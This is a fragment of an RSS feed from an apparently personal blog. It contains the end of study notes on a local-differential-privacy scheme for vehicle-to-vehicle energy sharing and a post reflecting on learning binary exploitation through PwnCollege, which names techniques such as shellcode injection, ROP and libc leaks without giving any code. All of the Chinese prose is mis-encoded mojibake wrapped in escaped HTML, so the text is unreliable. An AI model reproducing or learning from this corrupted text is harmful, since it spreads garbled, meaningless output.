		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143658121.png&#34;
			width=&#34;659&#34;
			height=&#34;415&#34;
			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143658121_hu1422207598453298841.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143658121_hu10144600491940394866.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;APA Model&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;APA Model&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;å…¬å¼1ï¼šä½¿ç”¨é«˜æ–¯æ ¸å‡½æ•°å’Œæ›¼å“ˆé¡¿è·ç¦»æ¥è¡¡é‡ä½ç½®çš„ç›¸ä¼¼æ€§ï¼Œå‚æ•°Ïƒè¡¨ç¤ºç¼©æ”¾å‚æ•°ï¼Œå†³å®šäº†ç›¸ä¼¼æ€§éšç€è·ç¦»é€’å‡è€Œæ”¾å¤§çš„é€Ÿç‡ã€‚Sçš„å–å€¼èŒƒå›´æ˜¯[0,1]ã€‚&lt;/p&gt;
&lt;p&gt;å…¬å¼2ï¼šè½¨è¿¹ä¿¡æ¯æ³„éœ²é‡(TIL) = æ±‚å’Œ[1/(ç›¸ä¼¼æ€§Ã—è·ç¦»)]ï¼Ÿ&lt;/p&gt;
&lt;p&gt;å…¬å¼3ï¼š&lt;strong&gt;Îµ&lt;/strong&gt;remainè¡¨ç¤ºå‰©ä½™çš„éšç§é¢„ç®—ï¼ŒÎµtotalè¡¨ç¤ºæ€»ä½“éšç§é¢„ç®—ï¼ŒÎµkè¡¨ç¤ºæŒ‡å®šä½ç½®éšç§é¢„ç®—æ”¯å‡ºã€‚&lt;/p&gt;
&lt;p&gt;å…¬å¼4ï¼šÎµmin å’Œ Îµmaxåˆ†åˆ«**ï¼š**å¼•å…¥Îµ minæ¥é¿å…å°†å¾®è–„çš„é¢„ç®—åˆ†é…åˆ°åç»­ä½ç½®ï¼ŒÎµ maxæ˜¯æœ€å¤§éšç§é¢„ç®—ä¸Šé™çš„é˜ˆå€¼ã€‚&lt;/p&gt;
&lt;h2 id=&#34;hupæ¨¡å‹-å¹³è¡¡æ•°æ®éšç§ä¿æŠ¤æ°´å¹³å’Œæ•°æ®æ•ˆç”¨çš„é«˜æ•ˆç”¨æ‰°åŠ¨&#34;&gt;HUPæ¨¡å‹ å¹³è¡¡æ•°æ®éšç§ä¿æŠ¤æ°´å¹³å’Œæ•°æ®æ•ˆç”¨çš„é«˜æ•ˆç”¨æ‰°åŠ¨
&lt;/h2&gt;&lt;p&gt;ä½¿ç”¨HUPæ¨¡å‹çš„ä¸»è¦ç›®çš„æ˜¯åœ¨ä½¿ç”¨LDPæ–¹æ³•ä¿æŠ¤æ•°æ®éšç§çš„åŒæ—¶ï¼Œå°½å¯èƒ½åœ°ä¿ç•™åŸå§‹æ•°æ®çš„æœ‰ç”¨ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œå½“æˆ‘ä»¬éœ€è¦å…±äº«æ•æ„Ÿæ•°æ®æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä½ç½®æ‰°åŠ¨ç®—æ³•å¯¹ä¸€äº›æ•°æ®ç‚¹çš„ä½ç½®è¿›è¡Œæ‰°åŠ¨ï¼Œè€Œä¸æ˜¯å®Œå…¨æŒ‰ç…§LDPæ–¹æ³•ä¿®æ”¹æ•°æ®ç‚¹çš„å€¼ã€‚ï¼ˆä¸æ˜¯å¾ˆèƒ½ç†è§£ï¼‰&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 138; 
			flex-basis: 331px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143736357.png&#34; data-size=&#34;340x246&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143736357.png&#34;
			width=&#34;340&#34;
			height=&#34;246&#34;
			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143736357_hu18299786016816125202.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143736357_hu2112904138365969308.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;HUP model&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;HUP model&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;å› æ­¤ï¼Œä¸ºäº†æœ€å°åŒ–å‚ä¸è€…çš„è½¨è¿¹éšç§æ³„éœ²é£é™©å’Œæœ€å¤§åŒ–ç»Ÿè®¡æ•ˆç”¨ï¼Œæˆ‘ä»¬æå‡ºäº†åŸºäºé˜ˆå€¼çš„ä½ç½®æ‰°åŠ¨( TPP )ç®—æ³•æ¥è·å¾—æ‰°åŠ¨ä½ç½®ã€‚&lt;/p&gt;
&lt;p&gt;TPPç®—æ³•åœ¨ä¿è¯æ•°æ®æ•ˆç”¨çš„åŒæ—¶ï¼Œä¼˜åŒ–äº†&lt;strong&gt;Hausdorffè·ç¦»&lt;/strong&gt;ä¸å˜æ€§çš„æ•°æ®å¤„ç†æµç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 95; 
			flex-basis: 229px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143805378.png&#34; data-size=&#34;669x699&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143805378.png&#34;
			width=&#34;669&#34;
			height=&#34;699&#34;
			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143805378_hu5228982941530961936.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143805378_hu8803011660550759096.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Algorithm 1&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Algorithm 1&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;pwa-æ”¹è¿›è½¨è¿¹éšç§ä¿æŠ¤çš„éšç§åŠ æƒå¹³å‡-é˜²æ­¢æ‰°åŠ¨ä½ç½®å¤ªå‡äº†å®¹æ˜“è¢«è¾¨åˆ«å‡ºæ¥&#34;&gt;PWA æ”¹è¿›è½¨è¿¹éšç§ä¿æŠ¤çš„éšç§åŠ æƒå¹³å‡ ï¼ˆé˜²æ­¢æ‰°åŠ¨ä½ç½®å¤ªå‡äº†ï¼Œå®¹æ˜“è¢«è¾¨åˆ«å‡ºæ¥ï¼‰
&lt;/h2&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 133; 
			flex-basis: 319px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143844201.png&#34; data-size=&#34;321x241&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143844201.png&#34;
			width=&#34;321&#34;
			height=&#34;241&#34;
			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143844201_hu1574775299246013532.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143844201_hu8527504982689013116.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;PWA Model&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;PWA Model&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;é—®é¢˜&#34;&gt;é—®é¢˜ï¼š
&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;è¯¥æ–‡ç« ä½¿ç”¨äº†å·®åˆ†éšç§çš„æ‰°ä¹±æœºåˆ¶çš„å…·ä½“æŠ€æœ¯ï¼Ÿæ–‡ç« ä¸­å¹¶æ²¡æœ‰æåˆ°è¯´ä½¿ç”¨ä»€ä¹ˆæ‰°åŠ¨æœºåˆ¶ã€‚åªæåˆ°äº†LDPï¼Œlocal å·®åˆ†éšç§ã€‚&lt;/li&gt;
&lt;li&gt;è¯¥æ–¹æ¡ˆä¸­APAæ¨¡å‹ä¸­çš„ç¬¬ä¸‰æ­¥ï¼Œç¬¬å››æ­¥çš„å…·ä½“å«ä¹‰ï¼Ÿ
&lt;ol&gt;
&lt;li&gt;ç­”ï¼šAPAéšç§é¢„ç®—è‡ªé€‚åº”åˆ†é…æ¨¡å‹ï¼Œéšç§é¢„ç®—è¾ƒå¤§æ—¶ï¼Œå™ªå£°è¾ƒé«˜ï¼Œä¿æŠ¤æ°´å¹³é«˜ï¼Œä½†æ˜¯ä¿¡æ¯å¯ç”¨æ€§ä¼šæ”¶åˆ°å½±å“ï¼›å½“éšç§é¢„ç®—è¾ƒå°æ—¶ï¼Œå™ªå£°è¾ƒä½ï¼Œä¿æŠ¤æ°´å¹³ä½ï¼Œä½†æ˜¯ä¿¡æ¯çš„å¯ç”¨æ€§è¾ƒé«˜ã€‚ å¯¹äºå‰©ä½™éšç§é¢„ç®—&lt;/li&gt;
&lt;li&gt;ç­”ï¼šå¯¹äºå…¬å¼3æ¥è¯´ï¼ŒAs evident from Fig. 3, formulas 3 and 4, the initial step involves the computation of the remaining privacy budget, denoted as Îµremain, for positions within the window [iÏ‰ + 1, i].æ–‡ç« ä¸­è¯´åˆ°è¿™ä¸ªå…¬å¼æ±‚å’Œçš„æ—¶å€™ï¼Œä½ç½®[iw+1,i]åŒºé—´å‰©ä½™çš„éšç§åº¦é‡ã€‚&lt;/li&gt;
&lt;li&gt;æ‡‚äº†ï¼Œä½¿ç”¨TIL&lt;em&gt;remainï¼Œè¡¨ç¤ºä¹‹å‰çš„éšç§æ³„éœ²é‡&lt;/em&gt;éšç§é¢„ç®—ï¼Œè¾¾åˆ°è€ƒè™‘ä¹‹å‰æ‰€ä»¥çš„å·®åˆ†éšç§ä½ç½®çš„å½±å“ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 244; 
			flex-basis: 586px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143953811.png&#34; data-size=&#34;814x333&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143953811.png&#34;
			width=&#34;814&#34;
			height=&#34;333&#34;
			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143953811_hu15781801442244549392.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143953811_hu9693468744045459166.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;å…¬å¼&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;å…¬å¼&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>PwnCollege å­¦ä¹ ç¬”è®°</title>
        <link>https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
        <pubDate>Fri, 17 May 2024 13:26:06 +0800</pubDate>
        
        <guid>https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
        <description>&lt;img src="https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517133556992.png" alt="Featured image of post PwnCollege å­¦ä¹ ç¬”è®°" /&gt;&lt;h1 id=&#34;1-å­¦ä¹ è·¯çº¿&#34;&gt;1. å­¦ä¹ è·¯çº¿
&lt;/h1&gt;&lt;p&gt;ä½œä¸ºä¸€åç½‘ç»œå®‰å…¨çš„å­¦ç”Ÿï¼Œæœ€å¼€å§‹æ¥è§¦åˆ°çš„å°±æ˜¯webå®‰å…¨ã€‚ä½†æ˜¯åœ¨å­¦ä¹ webå®‰å…¨çš„è¿‡ç¨‹ä¸­ï¼Œé€æ¸å‘ç°webå®‰å…¨éœ€è¦æ›´å¤šæ›´å¹¿çš„çŸ¥è¯†é¢ã€‚ä½†æ˜¯è¿™å¯¹äºç°åœ¨çš„æˆ‘æ¥è¯´æ˜¯ä¸ç°å®çš„ï¼Œå› ä¸ºåœ¨è¯»ç ”è¿‡ç¨‹ä¸­ï¼ŒèŠ±è´¹æ›´æ—¶é—´å»é˜…è¯»è®ºæ–‡å’Œå®Œæˆå¯¼å¸ˆçš„é¡¹ç›®ã€‚&lt;/p&gt;
&lt;p&gt;æ­¤å¤–ï¼Œæ€»æ˜¯å¬è§åˆ«äººè¯´ï¼Œpwnçˆ·ï¼Œpwnçˆ·çš„ï¼Œä¹Ÿè§‰å¾—å­¦ä¹ pwnï¼ŒäºŒè¿›åˆ¶å®‰å…¨æ˜¯å¾ˆå‰å®³çš„ã€‚ä¸è¿‡ä¹Ÿæ­£å¼å› ä¸ºå¦‚æ­¤ï¼Œpwnçš„å­¦ä¹ éœ€è¦å¾ˆå¤šåŸºæœ¬çŸ¥è¯†ï¼ˆæ±‡ç¼–ï¼ŒC/C++ï¼Œlinuxå®‰å…¨æœºåˆ¶ï¼Œå †æ ˆç›¸å…³çŸ¥è¯†ç­‰ï¼‰ã€‚æ€»ä¹‹å°±æ˜¯éœ€è¦å¾ˆå¤šçŸ¥è¯†ä½œä¸ºé“ºå«æ‰èƒ½å¸®åŠ©å»æ·±å…¥ç†è§£pwnçš„åŸç†å’ŒæŠ€æœ¯ã€‚&lt;/p&gt;
&lt;h1 id=&#34;2-pwncollege&#34;&gt;2. PwnCollege
&lt;/h1&gt;&lt;p&gt;ä¼—æ‰€å‘¨çŸ¥ï¼Œå­¦ä¹ å®‰å…¨æŠ€æœ¯ï¼Œç‰¹åˆ«æ˜¯è¿™ç§å›½å†…æ•æ„ŸæŠ€æœ¯ï¼Œå¾ˆå¤šå›½å†…çš„ç½‘ç«™æ˜¯æ— æ³•æ‰¾åˆ°èµ„æºçš„ã€‚æœºç¼˜å·§åˆä¹‹å‰ï¼Œæˆ‘è®¤è¯†äº†ä¸€ä¸ªå¤§ä½¬åŒå­¦ï¼ˆè…¾è®¯å®‰å…¨ã€UCIåšå£«åœ¨è¯»ï¼‰ï¼Œåœ¨ä»–çš„å»ºè®®ä¸‹ï¼Œæˆ‘å¼€å§‹å°è¯•pwnCollegeçš„å­¦ä¹ ã€‚ä½œä¸ºä¸€ä¸ªè‹±è¯­é«˜è€ƒåªæœ‰100åˆ†çš„æˆ‘æ¥è¯´ï¼Œåœ¨å­¦ä¹ è¿‡ç¨‹ä¸­ç¡®å®é‡åˆ°äº†å¾ˆå¤šå¾ˆå¤šçš„å›°éš¾ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯å…´è¶£æ˜¯æœ€å¥½çš„è€å¸ˆï¼Œè¿™ä¸ªè¯¾ç¨‹çš„å­¦ä¹ ç›¸æ¯”è¯¾å ‚ä¸Šçš„è¯»PPTä¼šæ›´åŠ æœ‰è¶£ä¸”ä»¤äººå¿ƒåŠ¨ã€‚åœ¨è¿™ç§å…´è¶£çš„ä¸æ–­å¸å¼•ä¸‹ï¼Œæˆ‘ä»23å¹´8æœˆä»½å¼€å§‹å­¦ä¹ pwnCollegeçš„CES-466è¯¾ç¨‹ï¼Œæˆªè‡³ç›®å‰ä½ç½®å·²ç»å®Œæˆä¸€åŠå†…å®¹ çš„å­¦ä¹ ã€‚å½“ç„¶è·ç¦»è“å¸¦çš„è·¯è¿˜æ˜¯å¾ˆè¿œå¾ˆè¿œã€‚&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 218; 
			flex-basis: 524px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135251761.png&#34; data-size=&#34;686x314&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135251761.png&#34;
			width=&#34;686&#34;
			height=&#34;314&#34;
			srcset=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135251761_hu13477238092531730755.png 480w, https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135251761_hu2648177404691251340.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 138; 
			flex-basis: 333px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135330228.png&#34; data-size=&#34;1426x1026&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135330228.png&#34;
			width=&#34;1426&#34;
			height=&#34;1026&#34;
			srcset=&#34;https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135330228_hu633313453631095762.png 480w, https://id-none.github.io/2024/pwncollege-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240517135330228_hu9109907385128331726.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ä»æœ€ç®€å•çš„ç¨‹åºäº¤äº’-&amp;gt;æ±‡ç¼–åŸºç¡€-&amp;gt;shellcodeæ³¨å…¥-&amp;gt;debug-&amp;gt;é€†å‘å·¥ç¨‹ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨è¿™äº›å­¦ä¹ è¿‡ç¨‹ä¸­ï¼Œæˆ‘æ”¶è·å¾ˆå¤šï¼Œå¼€å§‹é€æ¸å‘ç€è®¡ç®—æœºåº•å±‚é è¿‘ã€‚&lt;/p&gt;
&lt;h1 id=&#34;3-æ„Ÿå—&#34;&gt;3. æ„Ÿå—
&lt;/h1&gt;&lt;p&gt;é€šè¿‡å†¯è¯ºä¾æ›¼ç»“æ„çš„ä»£ç æ®µå’Œtextæ®µæ²¡æœ‰æ˜æ˜¾åŒºåˆ«å¯ä»¥åœ¨å †æ ˆä¸Šå†™å…¥shellcodeï¼Œå»æ‰§è¡Œæ¶æ„ä»£ç ï¼›&lt;/p&gt;
&lt;p&gt;è®¾ç½®ROPå®Œæˆç³»ç»Ÿè°ƒç”¨ï¼›æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²ç¨‹åºcarryï¼Œçˆ†ç ´PIEï¼Œlibcåœ°å€æ³„éœ²ï¼Œä»»æ„å†…å­˜è¯»å†™å»ä¿®æ”¹æ±‡ç¼–æŒ‡ä»¤å®Œæˆç¨‹åºæ‰§è¡Œæµï¼ˆCFIï¼‰çš„æ§åˆ¶ï¼Œè¿™äº›éƒ½æ˜¯æˆ‘åœ¨å­¦ä¹ ä¸­è·å¾—çš„çŸ¥è¯†ã€‚æ¯ä¸€æ¬¡è¿‡é¢˜ï¼Œéƒ½æ˜¯ä¸€ç§å‰æ‰€æœªæœ‰çš„å¹¸ç¦ï¼Œä¸ä»…ä»…æ˜¯è‡ªå·±çš„çŸ¥è¯†å¢é•¿äº†ï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œè§£å¼€äº†æ‰€è°“â€æŠ½è±¡â€œçš„é¢çº±ã€‚&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
